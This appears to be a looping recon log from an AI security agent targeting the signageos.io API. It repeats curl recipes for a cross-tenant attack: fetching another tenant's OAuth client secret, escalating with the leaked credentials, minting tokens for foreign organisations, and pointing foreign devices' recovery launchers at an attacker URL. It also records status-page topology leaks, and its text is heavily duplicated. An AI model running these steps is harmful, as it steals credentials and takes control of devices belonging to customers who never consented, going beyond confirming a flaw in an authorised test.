[NEXT] HUMAN: Execute the standing H1 POC — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret; 3) same header on a second tenant's org UID → **200 + oauthClientSecret = confirmed CRITICAL cross-tenant credential disclosure**; 4) escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in recipe.
[RISK] box.signageos.io: 58 — Auth0-redirect wall on all paths except /status (pod hostname + Redis/Mongo/AMQP topology + Node version), /login/ (CSP 40+ origins, 18 static ACAO incl http:// + *.zdusercontent.com, no credentials), /ready. Moderate operational exposure; no data access without credentials.
[RISK] api.signageos.io: 50 — /status info leak same class; every v1/v2 route (incl. newly-mapped POST-only set) solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface; only 403 descriptive error bodies (excluded). Residual exposure is the code-verified AUTH_HELPED cross-tenant org/device IDOR chain against the high-value device/content API — highest-severity finding if server-side org-membership check on path UIDs is absent.
## 2026-08-08 04:45:05 UTC [box] (model bigpickle)
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 75
reasoning: SDK/CLI code-verified — GET sends `X-Auth: <JWT>`, no organizationUid query param; response maps oauthClientId+oauthClientSecret; uid is an arbitrary CLI arg; per-path org-membership check is the sole barrier; 403 pre-auth reconfirmed this cycle.
evidence_needed: own JWT → HTTP 200 (not 403) on a foreign org UID returning oauthClientSecret.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-uid>` = 200; repeat with a second tenant's org UID → 200 + secret = cross-tenant; escalate `curl -H "X-Auth: <clientId>:<secret>" https://api.signageos.io/v1/device`.
impact: any tenant's org API credential → full foreign device/content/firmware control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 65
reasoning: OrganizationTokenManagement.ts code-verified — GET list + POST `{"name":...}` with client-supplied UID; path UID + JWT membership check is the only barrier; endpoint 403 pre-auth reconfirmed.
evidence_needed: own creds → 200 on foreign uid; POST mints a token accepted by /v1/device.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign uid → 200 = cross-tenant; POST `{"name":"poc"}` then `curl -H "X-Auth: <token>" https://api.signageos.io/v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 64
reasoning: DevicePeerRecoveryManagement.ts code-verified — deviceUid is arbitrary path arg; legacy `X-Auth: clientId:secret` derives org from credential; org→device binding is the sole barrier; 403 pre-auth reconfirmed.
evidence_needed: own legacy creds → 200 on a foreign device uid.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[NEXT] HUMAN: Execute the standing H1 POC — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret (get own UID from `sos organization list`); 3) repeat on a second tenant's org UID → **200 + oauthClientSecret = confirmed CRITICAL cross-tenant credential disclosure**; 4) escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in this recipe.
## 2026-08-08 05:27:16 UTC [box] (model bigpickle)
## 2026-08-08 06:05:02 UTC [box] (model bigpickle)
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 64
reasoning: DevicePeerRecoveryManagement.ts code-verified; deviceUid is arbitrary path arg; legacy X-Auth derives org from credential; org→device binding is sole barrier; 403 pre-auth reconfirmed today.
evidence_needed: own legacy creds → 200 on foreign device uid.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}`.
impact: read/overwrite foreign device recovery-launcher → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[NEXT] HUMAN: Execute the standing H1 POC — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret; 3) same header on a second tenant's org UID → **200 + oauthClientSecret = confirmed CRITICAL cross-tenant credential disclosure**; 4) escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in recipe.
[RISK] box.signageos.io: 58 — Auth0-redirect wall on all paths except /status (pod hostname + Redis/Mongo/AMQP topology + Node version), /login/ (CSP 40+ origins, 18 static ACAO incl http:// + *.zdusercontent.com, no credentials), /ready. Moderate operational exposure; no data access without credentials.
[RISK] api.signageos.io: 50 — /status info leak same class; every v1/v2 route (incl. newly-mapped POST-only set) solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface; only 403 descriptive error bodies (excluded). Residual exposure is the code-verified AUTH_HELPED cross-tenant org/device IDOR chain against the high-value device/content API — highest-severity finding if server-side org-membership check on path UIDs is absent.
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 75
reasoning: SDK/CLI code-verified — GET sends `X-Auth: <JWT>`, no organizationUid query param; response maps oauthClientId+oauthClientSecret; uid is an arbitrary CLI arg; per-path org-membership check is the sole barrier; 403 pre-auth reconfirmed this cycle.
evidence_needed: own JWT → HTTP 200 (not 403) on a foreign org UID returning oauthClientSecret.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-uid>` = 200; repeat with a second tenant's org UID → 200 + secret = cross-tenant; escalate `curl -H "X-Auth: <clientId>:<secret>" https://api.signageos.io/v1/device`.
impact: any tenant's org API credential → full foreign device/content/firmware control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 65
reasoning: OrganizationTokenManagement.ts code-verified — GET list + POST `{"name":...}` with client-supplied UID; path UID + JWT membership check is the only barrier; endpoint 403 pre-auth reconfirmed.
evidence_needed: own creds → 200 on foreign uid; POST mints a token accepted by /v1/device.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign uid → 200 = cross-tenant; POST `{"name":"poc"}` then `curl -H "X-Auth: <token>" https://api.signageos.io/v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 64
reasoning: DevicePeerRecoveryManagement.ts code-verified — deviceUid is arbitrary path arg; legacy `X-Auth: clientId:secret` derives org from credential; org→device binding is the sole barrier; 403 pre-auth reconfirmed.
evidence_needed: own legacy creds → 200 on a foreign device uid.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[NEXT] HUMAN: Execute the standing H1 POC — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret (get own UID from `sos organization list`); 3) repeat on a second tenant's org UID → **200 + oauthClientSecret = confirmed CRITICAL cross-tenant credential disclosure**; 4) escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in this recipe.
[CHANGED] box.signageos.io/status pod hostname rotated to box-7c8c876945-gkzcp (Node v20.20.2) — known rolling-deploy churn, no functional change
[CHANGED] api.signageos.io/status pod hostname rotated to api-6f69db97d5-st6zq (Node v24.19.0) — known rolling-deploy churn, no functional change
[PRIO] api.signageos.io/v1/organization/{organizationUid} | 8.2 | attack=10 business=10 tech=9 gate=2 cloud=6 fresh=6 | code-verified oauthClientSecret disclosure; sole barrier = per-path org membership check; untestable without JWT
[PRIO] api.signageos.io/v1/organization/{uid}/security-token | 7.8 | attack=10 business=9 tech=8 gate=2 cloud=6 fresh=7 | GET list + POST mint with client-supplied UID; any tenant token → device control
[PRIO] api.signageos.io/v1/device/{deviceUid}/peer-recovery | 7.5 | attack=10 business=9 tech=8 gate=2 cloud=5 fresh=6 | read/write foreign recovery-launcher via arbitrary deviceUid; legacy X-Auth derives org only from credential
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 75
reasoning: SDK/CLI code-verified — GET sends `X-Auth: <JWT>`, no organizationUid query param; response maps oauthClientId+oauthClientSecret; uid is arbitrary CLI arg; per-path org-membership check is the sole barrier; 403 pre-auth reconfirmed this cycle; all passive probes (v1/v2/status/cors/csp) unchanged.
evidence_needed: own JWT → HTTP 200 (not 403) on a foreign org UID returning oauthClientSecret.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-uid>` = 200; repeat with a second tenant's org UID → 200 + secret = cross-tenant; escalate `curl -H "X-Auth: <clientId>:<secret>" https://api.signageos.io/v1/device`.
impact: any tenant's org API credential → full foreign device/content/firmware control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 65
reasoning: OrganizationTokenManagement.ts code-verified — GET list + POST `{"name":...}` with client-supplied UID; path UID + JWT membership check is only barrier; endpoint 403 pre-auth reconfirmed; unchanged this cycle.
evidence_needed: own creds → 200 on foreign uid; POST mints a token accepted by /v1/device.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign uid → 200 = cross-tenant; POST `{"name":"poc"}` then `curl -H "X-Auth: <token>" https://api.signageos.io/v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 64
reasoning: DevicePeerRecoveryManagement.ts code-verified — deviceUid is arbitrary path arg; legacy `X-Auth: clientId:secret` derives org from credential; org→device binding is the sole barrier; 403 pre-auth reconfirmed this cycle.
evidence_needed: own legacy creds → 200 on a foreign device uid.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[FINAL] 1) H1 Cross-tenant org OAuth client-secret disclosure (75, CRITICAL)  2) H2 security-token minting (65, CRITICAL)  3) H3 peer-recovery read/write (64, HIGH→CRITICAL)
[NEXT] HUMAN: Execute standing H1 POC — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret (own UID from `sos organization list`); 3) same header on a second tenant's org UID → 200 + oauthClientSecret = CONFIRMED CRITICAL cross-tenant credential disclosure; 4) escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in recipe.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io/status: Reconfirmed live this cycle. Node v20.20.2, pod box-7c8c876945-gkzcp, succeededServices (amqp0, redis0-3, mongoDB0-3). Unchanged.
[LEARN] ACCEPTED MISCONFIG @ api.signageos.io/status: Reconfirmed live this cycle. Node v24.19.0, pod api-6f69db97d5-st6zq, same topology. Unchanged.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CORS: Reconfirmed — 17 static ACAO (incl http:// variant + https://*.zdusercontent.com), no credentials header, unchanged under any Origin. Unchanged.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CSP: Reconfirmed — /login/ CSP 40+ connect-src/frame-src origins, triplicated Auth0 oauth/token. Unchanged.
[LEARN] REJECTED IDOR @ api.signageos.io/v1/*+v2/*: Reconfirmed — all routes 403 JWT/X-Auth-gated, no pre-auth bypass surface. Unchanged.
[LEARN] REJECTED AUTH @ box.signageos.io/login: Auth0 OAuth2 flow params still not testable passively. Carried forward.
[RISK] box.signageos.io: 58 — Auth0-redirect wall on all paths except /status (pod hostname + Redis/Mongo/AMQP topology + Node version), /login/ (CSP 40+ origins, 17 static ACAO incl http:// + *.zdusercontent.com, no credentials), /ready. Moderate operational exposure; no data access without credentials.
[RISK] api.signageos.io: 50 — /status info leak same class; every v1/v2 route solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface; only 403 descriptive error bodies (excluded). Residual exposure is the code-verified AUTH_HELPED cross-tenant org/device IDOR chain against the high-value device/content API — highest-severity finding if server-side org-membership check on path UIDs is absent.
## 2026-08-08 07:08:08 UTC [box] (model bigpickle)
[HYP] Cross-tenant org OAuth client-secret disclosure via account token
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 75
reasoning: SDK/CLI code-verified — GET sends `X-Auth: <JWT>`, no organizationUid query param; response maps oauthClientId+oauthClientSecret; uid is arbitrary CLI arg; per-path org-membership check is the sole barrier; endpoint still 403 pre-auth this cycle.
evidence_needed: own JWT → HTTP 200 (not 403) on a foreign org UID returning oauthClientSecret.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-uid>` = 200; repeat with second tenant's org UID → 200 + secret = cross-tenant; escalate `curl -H "X-Auth: <clientId>:<secret>" https://api.signageos.io/v1/device`.
impact: any tenant's org API credential → full foreign device/content/firmware control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account token
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 65
reasoning: OrganizationTokenManagement.ts code-verified — GET list + POST `{"name":...}` with client-supplied UID; path UID + JWT membership check is the only barrier; endpoint 403 pre-auth reconfirmed.
evidence_needed: own creds → 200 on foreign uid; POST mints a token accepted by /v1/device.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign uid → 200 = cross-tenant; POST `{"name":"poc"}` then `curl -H "X-Auth: <token>" https://api.signageos.io/v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 64
reasoning: DevicePeerRecoveryManagement.ts code-verified — deviceUid is arbitrary path arg; legacy `X-Auth: clientId:secret` derives org from credential; org→device binding is the sole barrier; 403 pre-auth reconfirmed.
evidence_needed: own legacy creds → 200 on a foreign device uid.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[FINAL] 1) H1 Cross-tenant org OAuth client-secret disclosure (75, CRITICAL)  2) H2 security-token minting (65, CRITICAL)  3) H3 peer-recovery read/write (64, HIGH→CRITICAL)
[NEXT] HUMAN: Execute the standing H1 POC — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret (own UID from `sos organization list`); 3) same header on a second tenant's org UID → 200 + oauthClientSecret = CONFIRMED CRITICAL cross-tenant credential disclosure; 4) escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in recipe.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io/status: Reconfirmed live. Node v20.20.2, pod box-7c8c876945-52dpt, succeededServices (amqp0, redis0-3, mongoDB0-3). Unchanged.
[LEARN] ACCEPTED MISCONFIG @ api.signageos.io/status: Reconfirmed live. Node v24.19.0, pod api-6f69db97d5-dw2j2, same topology. Unchanged.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CORS: Reconfirmed — 17 static ACAO (incl http:// variant + https://*.zdusercontent.com), no credentials header, unchanged under any Origin.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CSP: Reconfirmed — /login/ CSP 40+ connect-src/frame-src origins, triplicated Auth0 oauth/token. Unchanged.
[LEARN] REJECTED IDOR @ api.signageos.io/v1/*+v2/*: Reconfirmed — all routes 403 JWT/X-Auth-gated, no pre-auth bypass surface. Unchanged.
[LEARN] REJECTED AUTH @ box.signageos.io/login: Auth0 OAuth2 flow params still not testable passively. Carried forward.
[RISK] box.signageos.io: 58 — Auth0-redirect wall on all paths except /status (pod hostname + Redis/Mongo/AMQP topology + Node version), /login/ (CSP 40+ origins, 17 static ACAO incl http:// + *.zdusercontent.com, no credentials), /ready. Moderate operational exposure; no data access without credentials.
[RISK] api.signageos.io: 50 — /status info leak same class; every v1/v2 route solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface; only 403 descriptive error bodies (excluded). Residual exposure is the code-verified AUTH_HELPED cross-tenant org/device IDOR chain against the high-value device/content API — highest-severity finding if server-side org-membership check on path UIDs is absent.
## 2026-08-08 07:56:30 UTC [box] (model bigpickle)
[HYP] Cross-tenant org OAuth client-secret disclosure via account JWT
class: IDOR
asset: api.signageos.io/v1/organization/{organizationUid} (GET)
confidence: 75
reasoning: SDK/CLI code-verified — GET sends `X-Auth: <JWT>` with client-supplied UID as path arg, no org-membership query param; response maps oauthClientId+oauthClientSecret; still 403 pre-auth this cycle; per-path org-membership check is the sole barrier.
evidence_needed: own JWT → HTTP 200 (not 403) on a foreign org UID returning oauthClientSecret.
verify_steps: AUTH_HELPED: baseline `curl -H "X-Auth: <jwt>" https://api.signageos.io/v1/organization/<own-uid>` = 200; repeat with second tenant's org UID → 200 + secret = cross-tenant; escalate `curl -H "X-Auth: <clientId>:<secret>" https://api.signageos.io/v1/device`.
impact: any tenant's org API credential → full foreign device/content/firmware control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant org security-token minting via account JWT
class: IDOR
asset: api.signageos.io/v1/organization/{uid}/security-token (GET/POST)
confidence: 65
reasoning: OrganizationTokenManagement.ts code-verified — GET list + POST `{"name":...}` with client-supplied UID; path UID + JWT membership check is the only barrier; 403 pre-auth reconfirmed.
evidence_needed: own creds → 200 on foreign uid; POST mints a token accepted by /v1/device.
verify_steps: AUTH_HELPED: baseline `GET /v1/organization/<own>/security-token` = 200; foreign uid → 200 = cross-tenant; POST `{"name":"poc"}` then `curl -H "X-Auth: <token>" https://api.signageos.io/v1/device`.
impact: mint org tokens for any tenant → full foreign-device control; CRITICAL
testability: AUTH_HELPED
[HYP] Cross-tenant device subresource read/write via client-supplied deviceUid
class: IDOR
asset: api.signageos.io/v1/device/{deviceUid}/peer-recovery (GET/PUT)
confidence: 64
reasoning: DevicePeerRecoveryManagement.ts code-verified — deviceUid is arbitrary path arg; legacy `X-Auth: clientId:secret` derives org from credential; org→device binding is the sole barrier; 403 pre-auth reconfirmed.
evidence_needed: own legacy creds → 200 on a foreign device uid.
verify_steps: AUTH_HELPED: baseline `GET /v1/device/<own-uid>/peer-recovery -H "X-Auth: <ownClientId>:<ownSecret>"` = 200; foreign uid → 200 = cross-tenant; PUT `{"enabled":true,"urlLauncherAddress":"https://<attacker>"}` confirms write.
impact: read/overwrite foreign device recovery-launcher config → device/content takeover; HIGH→CRITICAL
testability: AUTH_HELPED
[NEXT] HUMAN: Execute the standing H1 POC — 1) `sos login` (Auth0 device-code) mints account JWT; 2) baseline `curl -H "X-Auth: <jwt>" "https://api.signageos.io/v1/organization/<own-org-uid>"` → expect 200 + oauthClientSecret (own UID from `sos organization list`); 3) same header on a second tenant's org UID → 200 + oauthClientSecret = CONFIRMED CRITICAL cross-tenant credential disclosure; 4) escalate `curl -H "X-Auth: <leakedClientId>:<leakedSecret>" "https://api.signageos.io/v1/device"`; then H2 (GET/POST `/v1/organization/<foreign>/security-token`) and H3 (GET/PUT `/v1/device/<foreign-uid>/peer-recovery`). No organizationUid query param anywhere in recipe.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io/status: Reconfirmed live this cycle. Node v20.20.2, pod box-7c8c876945-gkzcp, succeededServices (amqp0, redis0-3, mongoDB0-3). Unchanged.
[LEARN] ACCEPTED MISCONFIG @ api.signageos.io/status: Reconfirmed live this cycle. Node v24.19.0, pod api-6f69db97d5-dw2j2, same topology. Unchanged.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CORS: Reconfirmed — 17 static ACAO (incl http:// variant + https://*.zdusercontent.com), no credentials header, unchanged under any Origin. Unchanged.
[LEARN] ACCEPTED MISCONFIG @ box.signageos.io CSP: Reconfirmed — /login/ CSP 40+ connect-src/frame-src origins (mapbox, events.mapbox, sentry, Auth0 oauth/token), triplicated Auth0 entries. Unchanged.
[LEARN] REJECTED IDOR @ api.signageos.io/v1/*+v2/*: Reconfirmed — all routes 403 JWT/X-Auth-gated, no pre-auth bypass surface. Unchanged.
[LEARN] REJECTED AUTH @ box.signageos.io/login: Auth0 OAuth2 flow params still not testable passively. Carried forward.
[RISK] box.signageos.io: 58 — Auth0-redirect wall on all paths except /status (pod hostname + Redis/Mongo/AMQP topology + Node version), /login/ (CSP 40+ origins, 17 static ACAO incl http:// + *.zdusercontent.com, no credentials), /ready. Moderate operational exposure; no data access without credentials.
[RISK] api.signageos.io: 50 — /status info leak same class; every v1/v2 route solidly JWT/legacy-X-Auth gated; no CORS/GraphQL surface; only 403 descriptive error bodies (excluded). Residual exposure is the code-verified AUTH_HELPED cross-tenant org/device IDOR chain against the high-value device/content API — highest-severity finding if server-side org-membership check on path UIDs is absent.
